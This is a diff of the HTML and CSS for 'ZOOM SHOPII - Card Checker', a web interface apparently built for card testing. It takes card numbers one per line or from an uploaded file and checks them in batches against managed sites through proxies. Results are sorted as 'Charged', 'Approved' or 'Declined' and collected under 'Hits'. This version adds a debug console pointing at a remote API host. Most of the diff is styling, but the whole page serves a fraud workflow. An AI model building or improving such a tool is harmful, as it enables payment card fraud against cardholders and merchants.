@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>ZOOM SHOPII - Card Checker</title>
     <style>
         /* ============================================================
-           ZOOM SHOPII - ULTIMATE EDITION (EXACTLY LIKE BOT)
+           ZOOM SHOPII - ULTIMATE EDITION WITH DEBUG
            ============================================================ */
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -36,9 +36,11 @@
             min-height: 100vh;
             overflow-x: hidden;
             padding: 10px;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
-        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: var(--bg-secondary); }
         ::-webkit-scrollbar-thumb { background: var(--neon-green); border-radius: 4px; }
 
@@ -48,14 +50,14 @@
             background: var(--bg-secondary);
             border: 2px solid var(--neon-green);
             border-radius: 12px;
-            padding: 15px 25px;
+            padding: 12px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 15px;
+            gap: 10px;
             box-shadow: 0 0 40px var(--shadow-glow);
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
 
         .logo-section {
@@ -68,11 +70,11 @@
         .logo-section .logo-top {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 12px;
         }
 
         .logo-section h1 {
-            font-size: 2rem;
+            font-size: 1.6rem;
             color: var(--neon-green);
             text-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
             animation: glitch 3s infinite;
@@ -85,15 +87,15 @@
 
         .version {
             color: var(--text-dim);
-            font-size: 0.7rem;
+            font-size: 0.6rem;
             background: var(--bg-card);
-            padding: 2px 10px;
+            padding: 2px 8px;
             border-radius: 4px;
             border: 1px solid var(--border-color);
         }
 
         .logo-sub {
-            font-size: 0.55rem;
+            font-size: 0.5rem;
             color: var(--text-dim);
             letter-spacing: 2px;
             opacity: 0.7;
@@ -102,47 +104,115 @@
 
         .stats-bar {
             display: flex;
-            gap: 25px;
+            gap: 12px;
             flex-wrap: wrap;
         }
 
         .stat-item { text-align: center; }
         .stat-label {
             display: block;
-            font-size: 0.6rem;
+            font-size: 0.5rem;
             color: var(--text-gray);
             text-transform: uppercase;
             letter-spacing: 1px;
         }
         .stat-value {
-            font-size: 1.3rem;
+            font-size: 1.1rem;
             font-weight: bold;
             color: var(--neon-green);
             text-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
         }
 
+        /* ===== DEBUG PANEL ===== */
+        .debug-panel {
+            background: var(--bg-secondary);
+            border: 2px solid var(--neon-orange);
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin-bottom: 12px;
+        }
+        .debug-panel .debug-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .debug-panel h2 {
+            color: var(--neon-orange);
+            font-size: 0.9rem;
+        }
+        .debug-panel .debug-toggle {
+            color: var(--neon-blue);
+            cursor: pointer;
+            text-decoration: underline;
+            font-size: 0.7rem;
+        }
+        .debug-content {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 8px 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 0.65rem;
+            color: var(--text-gray);
+            display: none;
+            margin-top: 8px;
+            font-family: 'Courier New', monospace;
+        }
+        .debug-content.active { display: block; }
+        .debug-content .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            gap: 8px;
+        }
+        .debug-content .log-entry .time {
+            color: var(--text-dim);
+            min-width: 70px;
+            flex-shrink: 0;
+        }
+        .debug-content .log-entry .success { color: var(--neon-green); }
+        .debug-content .log-entry .error { color: var(--neon-red); }
+        .debug-content .log-entry .info { color: var(--neon-blue); }
+        .debug-content .log-entry .warning { color: var(--neon-orange); }
+        .debug-content .log-entry .raw { color: var(--text-white); word-break: break-all; }
+
+        .debug-buttons {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+        .debug-buttons .btn {
+            padding: 4px 12px;
+            font-size: 0.65rem;
+            margin: 0;
+        }
+
         .main-layout {
             display: flex;
-            gap: 15px;
+            gap: 10px;
             min-height: 70vh;
         }
 
         .sidebar {
-            width: 200px;
+            width: 170px;
             background: var(--bg-secondary);
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            padding: 10px 0;
+            padding: 8px 0;
             flex-shrink: 0;
         }
 
         .nav-item {
-            padding: 12px 20px;
+            padding: 10px 15px;
             cursor: pointer;
             border-left: 3px solid transparent;
             transition: all 0.3s;
             color: var(--text-gray);
-            font-size: 0.9rem;
+            font-size: 0.75rem;
         }
         .nav-item:hover {
             background: var(--bg-card);
@@ -154,14 +224,14 @@
             color: var(--neon-green);
             font-weight: bold;
         }
-        .nav-item .icon { margin-right: 10px; }
+        .nav-item .icon { margin-right: 8px; }
 
         .content-area {
             flex: 1;
             background: var(--bg-secondary);
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            padding: 25px;
+            padding: 18px;
             min-height: 500px;
         }
 
@@ -177,28 +247,28 @@
         }
 
         .tab-content h2 {
-            font-size: 1.8rem;
-            margin-bottom: 5px;
+            font-size: 1.5rem;
+            margin-bottom: 4px;
             color: var(--neon-green);
         }
         .tab-content .subtitle {
             color: var(--text-gray);
-            margin-bottom: 20px;
-            font-size: 0.9rem;
+            margin-bottom: 15px;
+            font-size: 0.8rem;
         }
 
         .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px;
+            margin-top: 15px;
         }
 
         .dash-card {
             background: var(--bg-card);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 20px;
+            padding: 15px;
             transition: all 0.3s;
         }
         .dash-card:hover {
@@ -207,13 +277,13 @@
         }
         .dash-card h3 {
             color: var(--text-gray);
-            font-size: 0.75rem;
+            font-size: 0.65rem;
             text-transform: uppercase;
             letter-spacing: 1px;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .dash-card .number {
-            font-size: 2.2rem;
+            font-size: 1.8rem;
             font-weight: bold;
             color: var(--neon-green);
         }
@@ -224,7 +294,7 @@
         .dash-card .number.yellow { color: var(--neon-yellow); }
         .dash-card .label {
             color: var(--text-dim);
-            font-size: 0.75rem;
+            font-size: 0.65rem;
             margin-top: 4px;
         }
 
@@ -232,16 +302,16 @@
             background: var(--bg-card);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 15px;
+            padding: 15px;
+            margin-bottom: 12px;
         }
 
         .input-section label, .manual-section label {
             display: block;
             color: var(--neon-green);
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: bold;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
         }
 
         textarea {
@@ -250,11 +320,11 @@
             border: 1px solid var(--border-color);
             border-radius: 8px;
             color: var(--neon-green);
-            padding: 12px;
+            padding: 10px;
             font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             resize: vertical;
-            min-height: 120px;
+            min-height: 100px;
         }
         textarea:focus {
             outline: none;
@@ -263,16 +333,17 @@
         }
 
         .btn {
-            padding: 12px 30px;
+            padding: 10px 20px;
             border: none;
             border-radius: 8px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
-            font-size: 0.95rem;
+            font-size: 0.8rem;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 10px;
-            margin-right: 10px;
+            margin-top: 8px;
+            margin-right: 8px;
+            touch-action: manipulation;
         }
 
         .btn-primary {
@@ -339,48 +410,14 @@
         .btn-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 10px;
+            gap: 6px;
+            margin-top: 8px;
         }
-
-        /* Progress Filter Buttons */
-        .progress-filter-btn {
-            padding: 6px 18px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            background: var(--bg-card);
-            color: var(--text-gray);
-            font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 2px;
-        }
-        .progress-filter-btn:hover {
-            border-color: var(--neon-green);
-            color: var(--neon-green);
-        }
-        .progress-filter-btn.active {
-            border-color: var(--neon-green);
-            color: var(--neon-green);
-            background: rgba(0, 255, 65, 0.1);
-        }
-        .progress-filter-btn .count {
-            font-weight: bold;
-        }
-        .progress-filter-btn.all { border-color: var(--neon-blue); color: var(--neon-blue); }
-        .progress-filter-btn.all.active { background: rgba(0, 212, 255, 0.1); border-color: var(--neon-blue); }
-        .progress-filter-btn.charged { border-color: var(--neon-green); color: var(--neon-green); }
-        .progress-filter-btn.charged.active { background: rgba(0, 255, 65, 0.1); }
-        .progress-filter-btn.approved { border-color: var(--neon-orange); color: var(--neon-orange); }
-        .progress-filter-btn.approved.active { background: rgba(255, 136, 0, 0.1); }
-        .progress-filter-btn.declined { border-color: var(--neon-red); color: var(--neon-red); }
-        .progress-filter-btn.declined.active { background: rgba(255, 0, 51, 0.1); }
 
         .upload-section {
             border: 2px dashed var(--border-color);
             text-align: center;
-            padding: 40px;
+            padding: 30px;
             cursor: pointer;
             transition: all 0.3s;
         }
@@ -396,96 +433,90 @@
         .upload-section p {
             color: var(--text-gray);
             margin: 4px 0;
+            font-size: 0.85rem;
         }
         .upload-section .dim {
             color: var(--text-dim);
-            font-size: 0.8rem;
+            font-size: 0.75rem;
         }
 
         .progress-bar {
             width: 100%;
-            height: 24px;
+            height: 20px;
             background: var(--bg-input);
-            border-radius: 12px;
+            border-radius: 10px;
             overflow: hidden;
-            margin: 10px 0;
+            margin: 8px 0;
             border: 1px solid var(--border-color);
         }
         .progress-fill {
             height: 100%;
             background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
             transition: width 0.3s;
-            border-radius: 12px;
+            border-radius: 10px;
             width: 0%;
         }
 
-        .results-section { margin-top: 15px; }
+        .results-section { margin-top: 12px; }
         .results-section h3 {
             color: var(--neon-green);
-            margin-bottom: 10px;
-            font-size: 1rem;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
         }
 
         .result-item {
             background: var(--bg-card);
             border-left: 3px solid var(--neon-green);
-            padding: 8px 14px;
+            padding: 6px 12px;
             margin: 3px 0;
             border-radius: 4px;
-            font-size: 0.8rem;
+            font-size: 0.7rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 4px;
         }
         .result-item.dead { border-left-color: var(--neon-red); }
         .result-item.site-error { border-left-color: var(--neon-orange); }
 
-        .result-item .time-stamp {
-            font-size: 0.65rem;
-            color: var(--text-dim);
-            display: block;
-            margin-top: 2px;
-        }
-
         .status-badge {
-            padding: 2px 10px;
+            padding: 2px 8px;
             border-radius: 4px;
-            font-size: 0.7rem;
+            font-size: 0.6rem;
             font-weight: bold;
         }
         .status-badge.charged { background: rgba(0, 255, 65, 0.2); color: var(--neon-green); }
         .status-badge.approved { background: rgba(255, 136, 0, 0.2); color: var(--neon-orange); }
         .status-badge.dead { background: rgba(255, 0, 51, 0.15); color: var(--neon-red); }
         .status-badge.site-error { background: rgba(255, 136, 0, 0.15); color: var(--neon-orange); }
-        .status-badge.alive { background: rgba(0, 255, 65, 0.15); color: var(--neon-green); }
 
         .table-container {
             overflow-x: auto;
-            margin-top: 15px;
+            margin-top: 12px;
         }
         table {
             width: 100%;
             border-collapse: collapse;
-            font-size: 0.8rem;
+            font-size: 0.7rem;
         }
         th {
             background: var(--bg-card);
             color: var(--neon-green);
-            padding: 10px 12px;
+            padding: 8px 10px;
             text-align: left;
             border-bottom: 2px solid var(--neon-green);
             font-weight: bold;
         }
         td {
-            padding: 8px 12px;
+            padding: 6px 10px;
             border-bottom: 1px solid var(--border-color);
             color: var(--text-gray);
         }
         tr:hover td { background: var(--bg-card); }
 
-        /* ===== SITE/PROXY LIST - PROPER ALIGNMENT ===== */
         .list-container {
-            max-height: 400px;
+            max-height: 350px;
             overflow-y: auto;
             background: var(--bg-card);
             border-radius: 8px;
@@ -495,12 +526,12 @@
 
         .list-header {
             display: grid;
-            grid-template-columns: 50px 1fr 1.2fr;
-            padding: 8px 12px;
+            grid-template-columns: 40px 1fr 1.3fr;
+            padding: 6px 10px;
             border-bottom: 2px solid var(--border-color);
             font-weight: bold;
             color: var(--neon-green);
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             letter-spacing: 0.5px;
             text-transform: uppercase;
             position: sticky;
@@ -509,25 +540,25 @@
             z-index: 1;
         }
         .list-header .col-num { text-align: center; }
-        .list-header .col-left { text-align: left; padding-right: 10px; }
+        .list-header .col-left { text-align: left; padding-right: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .list-header .col-right {
             text-align: right;
             display: flex;
             justify-content: flex-end;
-            gap: 12px;
+            gap: 8px;
             flex-shrink: 0;
         }
-        .list-header .col-right .h-status { min-width: 60px; text-align: right; }
-        .list-header .col-right .h-latency { min-width: 60px; text-align: right; }
-        .list-header .col-right .h-added { min-width: 80px; text-align: right; }
-        .list-header .col-right .h-actions { min-width: 50px; text-align: right; }
+        .list-header .col-right .h-status { min-width: 50px; text-align: right; }
+        .list-header .col-right .h-latency { min-width: 50px; text-align: right; }
+        .list-header .col-right .h-added { min-width: 70px; text-align: right; }
+        .list-header .col-right .h-actions { min-width: 45px; text-align: right; }
 
         .list-item-row {
             display: grid;
-            grid-template-columns: 50px 1fr 1.2fr;
-            padding: 6px 12px;
+            grid-template-columns: 40px 1fr 1.3fr;
+            padding: 5px 10px;
             border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.72rem;
+            font-size: 0.68rem;
             align-items: center;
         }
         .list-item-row:hover {
@@ -536,7 +567,7 @@
         .list-item-row .row-num {
             text-align: center;
             color: var(--text-dim);
-            font-size: 0.65rem;
+            font-size: 0.6rem;
         }
         .list-item-row .row-left {
             text-align: left;
@@ -544,35 +575,35 @@
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
-            padding-right: 10px;
+            padding-right: 8px;
         }
         .list-item-row .row-right {
             text-align: right;
             display: flex;
             align-items: center;
             justify-content: flex-end;
-            gap: 12px;
+            gap: 8px;
             flex-shrink: 0;
             color: var(--text-gray);
         }
         .list-item-row .row-right .r-status {
-            min-width: 60px;
+            min-width: 50px;
             text-align: right;
             font-weight: bold;
         }
         .list-item-row .row-right .r-latency {
-            min-width: 60px;
+            min-width: 50px;
             text-align: right;
         }
         .list-item-row .row-right .r-added {
-            min-width: 80px;
+            min-width: 70px;
             text-align: right;
         }
         .list-item-row .row-right .r-actions {
-            min-width: 50px;
+            min-width: 45px;
             text-align: right;
             display: flex;
-            gap: 4px;
+            gap: 3px;
             justify-content: flex-end;
         }
         .list-item-row .row-right .status-alive { color: var(--neon-green); }
@@ -581,8 +612,8 @@
             background: none;
             border: none;
             cursor: pointer;
-            font-size: 0.8rem;
-            padding: 2px 4px;
+            font-size: 0.7rem;
+            padding: 2px 3px;
             border-radius: 4px;
             transition: all 0.2s;
             line-height: 1;
@@ -595,59 +626,59 @@
         .manager-section {
             display: grid;
             grid-template-columns: 1fr 1.5fr;
-            gap: 20px;
+            gap: 15px;
         }
 
         .upload-area, .manual-area {
             background: var(--bg-card);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 18px;
+            padding: 15px;
         }
         .upload-area h3, .manual-area h3 {
             color: var(--neon-green);
-            font-size: 1rem;
-            margin-bottom: 8px;
+            font-size: 0.85rem;
+            margin-bottom: 6px;
         }
         .upload-area p, .manual-area p {
             color: var(--text-gray);
-            font-size: 0.8rem;
-            margin-bottom: 10px;
+            font-size: 0.7rem;
+            margin-bottom: 8px;
         }
         .upload-area input[type="file"] {
             display: block;
-            margin: 10px 0;
+            margin: 8px 0;
             color: var(--text-gray);
-            font-size: 0.8rem;
+            font-size: 0.7rem;
         }
 
         .list-area {
             background: var(--bg-card);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 18px;
+            padding: 15px;
         }
         .list-area h3 {
             color: var(--neon-green);
-            font-size: 1rem;
-            margin-bottom: 8px;
+            font-size: 0.85rem;
+            margin-bottom: 6px;
         }
 
         .hit-controls {
             display: flex;
-            gap: 10px;
+            gap: 8px;
             flex-wrap: wrap;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
 
         .hit-filter-btn {
-            padding: 8px 20px;
+            padding: 6px 14px;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             background: var(--bg-card);
             color: var(--text-gray);
             font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             cursor: pointer;
             transition: all 0.3s;
         }
@@ -670,42 +701,47 @@
         .hit-item {
             background: var(--bg-card);
             border-left: 3px solid var(--neon-green);
-            padding: 10px 16px;
-            margin: 4px 0;
+            padding: 8px 12px;
+            margin: 3px 0;
             border-radius: 4px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
         }
         .hit-item .hit-info {
             display: flex;
             flex-direction: column;
+            flex: 1;
+            min-width: 150px;
         }
         .hit-item .hit-card {
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             color: var(--text-white);
             word-break: break-all;
         }
         .hit-item .hit-details {
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: var(--text-gray);
             margin-top: 2px;
             line-height: 1.4;
         }
         .hit-item .hit-time {
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             color: var(--text-dim);
             margin-top: 2px;
         }
         .hit-item .hit-amount {
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             color: var(--text-gray);
+            flex-shrink: 0;
         }
 
         .info-text {
             color: var(--text-gray);
-            font-size: 0.85rem;
-            margin: 5px 0;
+            font-size: 0.75rem;
+            margin: 4px 0;
         }
         .info-text .highlight {
             color: var(--neon-green);
@@ -716,49 +752,69 @@
             background: var(--bg-card);
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 12px 18px;
-            margin: 10px 0;
+            padding: 10px 14px;
+            margin: 8px 0;
             display: none;
+            font-size: 0.75rem;
         }
         .file-info .filename {
             color: var(--neon-green);
             font-weight: bold;
         }
-        .file-info .filecount {
-            color: var(--text-gray);
-        }
 
         .status-indicator {
             display: inline-block;
-            padding: 4px 12px;
+            padding: 3px 10px;
             border-radius: 4px;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: bold;
         }
         .status-indicator.running { background: rgba(0, 255, 65, 0.2); color: var(--neon-green); }
         .status-indicator.paused { background: rgba(255, 221, 0, 0.2); color: var(--neon-yellow); }
         .status-indicator.stopped { background: rgba(255, 0, 51, 0.2); color: var(--neon-red); }
+        .status-indicator.complete { background: rgba(0, 255, 65, 0.15); color: var(--neon-green); }
 
-        /* Progress filter container */
         .progress-filter-container {
             display: flex;
             flex-wrap: wrap;
-            gap: 6px;
-            margin: 10px 0;
-            padding: 10px;
+            gap: 4px;
+            margin: 8px 0;
+            padding: 8px;
             background: var(--bg-card);
             border-radius: 8px;
             border: 1px solid var(--border-color);
         }
         .progress-filter-container .label {
             color: var(--text-dim);
-            font-size: 0.75rem;
-            margin-right: 8px;
+            font-size: 0.65rem;
+            margin-right: 6px;
             display: flex;
             align-items: center;
         }
+        .progress-filter-btn {
+            padding: 4px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background: var(--bg-card);
+            color: var(--text-gray);
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .progress-filter-btn:hover {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+        }
+        .progress-filter-btn.active {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            background: rgba(0, 255, 65, 0.1);
+        }
+        .progress-filter-btn .count {
+            font-weight: bold;
+        }
 
-        /* Confirm Dialog Styling */
         .confirm-overlay {
             position: fixed;
             top: 0;
@@ -776,21 +832,21 @@
             background: var(--bg-secondary);
             border: 2px solid var(--neon-green);
             border-radius: 12px;
-            padding: 30px;
-            max-width: 400px;
+            padding: 25px;
+            max-width: 380px;
             width: 90%;
             text-align: center;
             box-shadow: 0 0 60px var(--shadow-glow);
         }
         .confirm-box h3 {
             color: var(--neon-green);
-            font-size: 1.2rem;
-            margin-bottom: 10px;
+            font-size: 1.1rem;
+            margin-bottom: 8px;
         }
         .confirm-box p {
             color: var(--text-gray);
-            margin-bottom: 20px;
-            font-size: 0.9rem;
+            margin-bottom: 15px;
+            font-size: 0.85rem;
         }
         .confirm-box .btn-group { justify-content: center; }
         .confirm-box .btn { margin: 0 5px; }
@@ -800,56 +856,58 @@
                 width: 100%;
                 display: flex;
                 flex-wrap: wrap;
-                padding: 8px;
+                padding: 6px;
                 gap: 2px;
             }
             .nav-item {
-                padding: 6px 12px;
-                font-size: 0.75rem;
+                padding: 6px 10px;
+                font-size: 0.65rem;
                 border-left: none;
                 border-bottom: 2px solid transparent;
                 flex: 1;
                 text-align: center;
-                min-width: 80px;
+                min-width: 60px;
             }
             .nav-item.active {
                 border-left: none;
                 border-bottom-color: var(--neon-green);
             }
             .main-layout { flex-direction: column; }
-            .stats-bar { gap: 10px; }
-            .stat-value { font-size: 1rem; }
+            .stats-bar { gap: 6px; }
+            .stat-value { font-size: 0.9rem; }
             .manager-section { grid-template-columns: 1fr; }
             .header { flex-direction: column; align-items: stretch; }
-            .logo-section h1 { font-size: 1.5rem; }
-            .dashboard-grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); }
+            .logo-section h1 { font-size: 1.3rem; }
+            .dashboard-grid { grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); }
+            .btn { padding: 8px 14px; font-size: 0.7rem; }
+            .content-area { padding: 12px; }
+            .debug-content { max-height: 150px; }
             .list-header, .list-item-row {
                 grid-template-columns: 30px 1fr 1.5fr;
-                font-size: 0.65rem;
+                font-size: 0.6rem;
             }
-            .list-item-row .row-right { gap: 6px; flex-wrap: wrap; justify-content: flex-end; }
+            .list-item-row .row-right { gap: 4px; flex-wrap: wrap; justify-content: flex-end; }
         }
 
         @media (max-width: 480px) {
-            .stats-bar { gap: 6px; }
-            .stat-item { min-width: 50px; }
-            .stat-value { font-size: 0.85rem; }
-            .content-area { padding: 12px; }
-            .btn { padding: 8px 16px; font-size: 0.8rem; width: 100%; margin-right: 0; }
-            .result-item { flex-wrap: wrap; gap: 4px; }
+            .stats-bar { gap: 4px; }
+            .stat-item { min-width: 40px; }
+            .stat-value { font-size: 0.75rem; }
             .btn-group { flex-direction: column; }
-            .progress-filter-container { flex-wrap: wrap; }
+            .btn { width: 100%; margin-right: 0; }
+            .result-item { flex-wrap: wrap; gap: 2px; font-size: 0.65rem; }
+            .debug-content { max-height: 120px; font-size: 0.6rem; }
             .list-header, .list-item-row {
                 grid-template-columns: 25px 1fr 1.5fr;
-                font-size: 0.6rem;
-                padding: 4px 8px;
+                font-size: 0.55rem;
+                padding: 4px 6px;
             }
-            .list-item-row .row-right { gap: 4px; font-size: 0.6rem; }
-            .list-item-row .row-right .r-status { min-width: 40px; }
-            .list-item-row .row-right .r-latency { min-width: 40px; }
-            .list-item-row .row-right .r-added { min-width: 50px; }
-            .list-item-row .row-right .r-actions { min-width: 40px; }
-            .list-item-row .row-right .btn-icon { font-size: 0.7rem; }
+            .list-item-row .row-right { gap: 3px; font-size: 0.55rem; }
+            .list-item-row .row-right .r-status { min-width: 35px; }
+            .list-item-row .row-right .r-latency { min-width: 35px; }
+            .list-item-row .row-right .r-added { min-width: 45px; }
+            .list-item-row .row-right .r-actions { min-width: 35px; }
+            .list-item-row .row-right .btn-icon { font-size: 0.6rem; }
         }
     </style>
 </head>
@@ -874,7 +932,7 @@
             <div class="logo-section">
                 <div class="logo-top">
                     <h1>ZOOM SHOPII</h1>
-                    <span class="version">v2.0</span>
+                    <span class="version">v3.0</span>
                 </div>
                 <div class="logo-sub">BY MELCHZEDECK</div>
             </div>
@@ -902,20 +960,40 @@
             </div>
         </header>
 
+        <!-- ===== DEBUG PANEL ===== -->
+        <div class="debug-panel">
+            <div class="debug-header">
+                <h2>🐛 DEBUG CONSOLE</h2>
+                <div>
+                    <span class="debug-toggle" onclick="toggleDebug()">[toggle]</span>
+                </div>
+            </div>
+            <div class="debug-content" id="debugContent">
+                <div class="log-entry"><span class="time">[INIT]</span> <span class="info">Debug console ready</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="info">API: shimmering-celebration-production-7dd0.up.railway.app</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="success">✅ Proxy validator supports ALL formats</span></div>
+            </div>
+            <div class="debug-buttons">
+                <button class="btn btn-secondary" onclick="clearDebug()">🗑️ Clear</button>
+                <button class="btn btn-warning" onclick="testAPI()">🔍 Test API</button>
+                <button class="btn btn-danger" onclick="testProxy()">🔌 Test Proxy</button>
+            </div>
+        </div>
+
         <!-- MAIN LAYOUT -->
         <div class="main-layout">
 
             <!-- SIDEBAR -->
             <nav class="sidebar">
                 <div class="nav-item active" data-tab="dashboard"><span class="icon">📊</span> OVERVIEW</div>
-                <div class="nav-item" data-tab="quickcheck"><span class="icon">🔍</span> Quick Check</div>
-                <div class="nav-item" data-tab="masscheck"><span class="icon">📦</span> Mass Check</div>
-                <div class="nav-item" data-tab="sites"><span class="icon">🌐</span> Site Manager</div>
-                <div class="nav-item" data-tab="proxies"><span class="icon">🔌</span> Proxy Manager</div>
+                <div class="nav-item" data-tab="quickcheck"><span class="icon">🔍</span> Quick</div>
+                <div class="nav-item" data-tab="masscheck"><span class="icon">📦</span> Mass</div>
+                <div class="nav-item" data-tab="sites"><span class="icon">🌐</span> Sites</div>
+                <div class="nav-item" data-tab="proxies"><span class="icon">🔌</span> Proxies</div>
                 <div class="nav-item" data-tab="hits"><span class="icon">🎯</span> Hits</div>
             </nav>
 
-            <!-- CONTENT AREA -->
+            <!-- CONTENT -->
             <div class="content-area">
 
                 <!-- DASHBOARD -->
@@ -929,8 +1007,8 @@
                         <div class="dash-card"><h3>Proxies</h3><div class="number orange" id="dashProxies">0</div><div class="label">live proxies</div></div>
                         <div class="dash-card"><h3>Declined</h3><div class="number red" id="dashDeclined">0</div><div class="label">declined cards</div></div>
                     </div>
-                    <div style="margin-top:20px;">
-                        <h3 style="color:var(--text-gray); font-size:0.9rem;">📋 Recent Hits</h3>
+                    <div style="margin-top:15px;">
+                        <h3 style="color:var(--text-gray); font-size:0.8rem;">📋 Recent Hits</h3>
                         <div class="table-container">
                             <table>
                                 <thead><tr><th>Status</th><th>Card</th><th>Type</th><th>Amount</th></tr></thead>
@@ -945,7 +1023,7 @@
                 <!-- QUICK CHECK -->
                 <div id="tab-quickcheck" class="tab-content">
                     <h2>🔍 Quick Check</h2>
-                    <p class="subtitle">Check cards instantly</p>
+                    <p class="subtitle">Check cards instantly — batch size: 100</p>
                     <div class="input-section">
                         <label>CARDS (ONE PER LINE, ANY FORMAT)</label>
                         <textarea id="quickCards" rows="8" placeholder="4111111111111111 | 12 | 26 | 123&#10;4111111111111111 : 12 : 2026 : 123&#10;4111111111111111 12 26 123"></textarea>
@@ -956,9 +1034,9 @@
                             <button class="btn btn-danger" id="quickStopBtn" disabled>⏹️ Stop</button>
                             <button class="btn btn-secondary" id="quickClearBtn">🗑️ Clear Results</button>
                         </div>
-                        <div style="margin-top:10px;">
+                        <div style="margin-top:8px;">
                             <span class="status-indicator stopped" id="quickStatus">⏹️ Stopped</span>
-                            <span class="info-text" style="margin-left:15px;">Progress: <span id="quickProgressText">0/0</span></span>
+                            <span class="info-text" style="margin-left:12px;">Progress: <span id="quickProgressText">0/0</span></span>
                         </div>
                         <div class="progress-filter-container" id="quickFilterContainer">
                             <span class="label">📊 Show:</span>
@@ -977,7 +1055,7 @@
                 <!-- MASS CHECK -->
                 <div id="tab-masscheck" class="tab-content">
                     <h2>📦 Mass Check</h2>
-                    <p class="subtitle">Upload a .txt file — click START to begin checking</p>
+                    <p class="subtitle">Upload a .txt file — click START — batch size: 200</p>
                     
                     <div class="upload-section" id="dropZone">
                         <p>📁 Drag & drop your .txt file here</p>
@@ -988,8 +1066,8 @@
 
                     <div class="file-info" id="fileInfo">
                         <span>📄 File: <span class="filename" id="fileNameDisplay">-</span></span>
-                        <span style="margin-left:15px;">💳 Cards: <span class="filecount" id="fileCardCount">0</span></span>
-                        <span style="margin-left:15px;">📊 Total: <span class="filecount" id="fileTotalDisplay">0</span></span>
+                        <span style="margin-left:12px;">💳 Cards: <span class="filecount" id="fileCardCount">0</span></span>
+                        <span style="margin-left:12px;">📊 Total: <span class="filecount" id="fileTotalDisplay">0</span></span>
                     </div>
 
                     <div class="btn-group">
@@ -999,9 +1077,9 @@
                         <button class="btn btn-danger" id="massStopBtn" disabled>⏹️ Stop</button>
                         <button class="btn btn-secondary" id="massClearBtn">🗑️ Clear Results</button>
                     </div>
-                    <div style="margin-top:10px;">
+                    <div style="margin-top:8px;">
                         <span class="status-indicator stopped" id="massStatusIndicator">⏹️ Stopped</span>
-                        <span class="info-text" style="margin-left:15px;">Progress: <span id="massProgressText">0/0</span></span>
+                        <span class="info-text" style="margin-left:12px;">Progress: <span id="massProgressText">0/0</span></span>
                     </div>
 
                     <div class="progress-filter-container" id="massFilterContainer">
@@ -1012,10 +1090,10 @@
                         <button class="progress-filter-btn declined" data-filter="declined" data-target="mass">❌ Declined <span class="count" id="massDeclinedFilterCount">0</span></button>
                     </div>
 
